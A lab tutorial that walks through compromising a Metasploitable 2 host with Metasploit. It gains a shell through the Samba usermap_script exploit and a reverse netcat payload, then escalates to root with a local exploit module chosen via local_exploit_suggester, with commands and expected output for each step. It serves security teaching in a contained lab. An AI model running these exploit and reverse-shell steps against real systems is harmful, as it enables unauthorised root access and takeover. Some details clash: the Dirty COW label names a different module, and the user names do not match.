# Achieving Root Privileges: Automated with Metasploit

## Estimated Time Needed
30 minutes

## Overview

Privilege escalation is one of the most critical steps in a real-world compromise. Adversaries who start as unprivileged users often seek to become root or administrator, enabling full control over the system. This access allows attackers to disable defenses, extract sensitive data, or deploy persistent backdoors. 

This lab demonstrates how automated tools such as **Metasploit** streamline privilege escalation and highlights why defenders must regularly patch kernels, audit permissions, and harden system configurations.

In this lab, you will escalate privileges from a limited user shell to root using automated exploitation techniques in **Metasploit**. You will:
1. Verify that you are operating from a non‑root session.
2. Collect system information.
3. Enumerate potential escalation vectors.
4. Use **Metasploit's local_exploit_suggester** to identify and run a privilege escalation exploit.
5. Achieve root access.

### Lab Safety
Use this only in a contained lab environment. Kernel exploits used here are highly dangerous on production systems.

## Learning Objectives

After completing this lab, you will be able to:

- Verify your current user and confirm non‑root privileges
- Collect baseline system information to guide privilege escalation
- Run Metasploit's `local_exploit_suggester` and interpret results
- Select and configure an appropriate local privilege escalation exploit
- Verify successful root access

## Notes/Assumptions

- Replace `<MSF2_IP>`, `<KALI_IP>`, and `<KALI_LISTEN_PORT>` with your actual addresses and port numbers. You can use the command `ifconfig` on both environments to get their respective IP addresses.

## Exercise 0: Session Verification and Baseline Checks

### Use a Compatible Exploit and Payload

1. Start **Metasploit**:
    ```bash
    msfconsole -q
    ```

2. Select the **Samba Exploit**:
    ```bash
    use exploit/multi/samba/usermap_script
    ```

3. Set your parameters:
    ```bash
    set RHOSTS <MSF2_IP>
    set RPORT 139
    set PAYLOAD cmd/unix/reverse_netcat
    set LHOST <KALI_IP>
    set LPORT 5555
    ```

4. Run the exploit:
    ```bash
    run
    ```

5. Switch to the `nobody` user (or appropriate):
    ```bash
    su -s /bin/sh nobody
    ```

### Confirm You Are Operating from a Non‑Root Session

Check your user and ID:

```bash
whoami
id
````

**Expected Output:**

```bash
daemon
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Why This Step is Important

Privilege escalation assumes you begin with limited rights. Confirming your baseline ensures the exercise is valid.

### Check Persistence of Your Session (Optional):

1. Background your session:

   ```bash
   background
   ```

2. List active sessions:

   ```bash
   sessions
   ```

### Why This Step is Important

Listing active sessions ensures you know which session ID to use when configuring Metasploit exploits.

## Exercise 1: Collect System Information

### Gather Kernel and OS Version Details

1. From your active session, run:

   ```bash
   sessions -i <Session_ID>
   uname -a
   cat /etc/issue
   ```

### Enumerate SUID Binaries (Optional Check)

1. Run the following command to find SUID binaries:

   ```bash
   find / -perm -4000 -type f 2>/dev/null | head -20
   ```

### Check Sudo Rights if Available

1. Check for sudo permissions:

   ```bash
   sudo -l
   ```

### Why This Step is Important

System and kernel version details guide exploit choice. SUID and sudo checks reveal manual escalation opportunities.

## Exercise 2: Launch Metasploit's Local Exploit Suggester

### Run the Local Exploit Suggester

1. From a **Meterpreter** session, run the local exploit suggester:

   ```bash
   background
   use post/multi/manage/shell_to_meterpreter
   set SESSION <Session_ID>
   set LHOST <KALI_IP>
   set LPORT 5555
   run
   ```

2. Check the new session ID:

   ```bash
   sessions
   ```

3. Interact with the upgraded session:

   ```bash
   sessions -i <New_Session_ID>
   ```

4. Run the local exploit suggester:

   ```bash
   run post/multi/recon/local_exploit_suggester
   ```

**Expected Output (Partial):**

```bash
[*] Collecting local exploits for x86/linux...
[+] exploit/linux/local/dirty_cow: The target appears to be vulnerable.
[+] exploit/linux/local/service_privesc: The target appears to be vulnerable.
```

### Why This Step is Important

This module tests the current environment against a library of known privilege escalation exploits and lists those likely to succeed.

### Troubleshooting

If no exploits appear, ensure your session is active and valid. You may need to re-run with a different payload or verify your session ID.

## Exercise 3: Select and Configure an Exploit

### Choose the Most Reliable Exploit from the Suggester Output (Example: Dirty COW)

1. Background the current session:

   ```bash
   background
   ```

2. Select and configure the chosen exploit:

   ```bash
   use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
   set SESSION <Session_ID>
   set LHOST <KALI_IP>
   set LPORT 4444
   set PAYLOAD linux/x86/meterpreter/reverse_tcp
   exploit
   ```

**Expected Output:**

```bash
[*] Started reverse TCP handler on <KALI_IP>:4444
[+] The target appears to be vulnerable
[*] Using target: Linux x86
[*] Writing '/tmp/.QwGBLSgh' (1271 bytes) ...
[*] Writing '/tmp/.wvBEKx' (286 bytes) ...
[*] Writing '/tmp/.dgY4pKfE' (207 bytes) ...
[*] Launching exploit...
[*] Sending stage (1017704 bytes) to <MSF2_IP>
[*] Meterpreter session 9 opened
```

### Why This Step is Important

Running a tested exploit provides a high chance of escalating privileges automatically, saving time over manual enumeration.

### Troubleshooting

If the exploit fails, try another candidate from the suggester output (for example, `service_privesc`).

## Exercise 4: Verify Root Access

### Confirm Root Access

1. In the new session, check your UID:

   ```bash
   getuid
   sysinfo
   ```

**Expected Output:**

```bash
meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```

### Why This Step is Important

Confirming `uid=0(root)` validates that the privilege escalation was successful.

## Summary

In this lab, you:

* Confirmed you were operating as a non‑root user
* Collected kernel and OS information to guide escalation
* Ran Metasploit's `local_exploit_suggester` and interpreted its output
* Executed a privilege escalation exploit (e.g., Dirty COW)
* Verified root access
